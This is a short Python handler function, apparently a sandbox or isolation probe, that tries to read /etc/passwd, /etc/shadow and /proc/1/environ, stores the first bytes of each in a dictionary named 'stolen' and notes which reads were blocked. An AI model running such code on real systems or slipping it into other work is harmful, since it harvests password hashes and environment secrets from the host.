def handler(event=None):
    targets = ["/etc/passwd", "/etc/shadow", "/proc/1/environ"]
    stolen = {}
    for path in targets:
        try:
            with open(path) as f:
                stolen[path] = f.read(256)
        except OSError as e:
            stolen[path] = f"blocked: {e}"
    return stolen
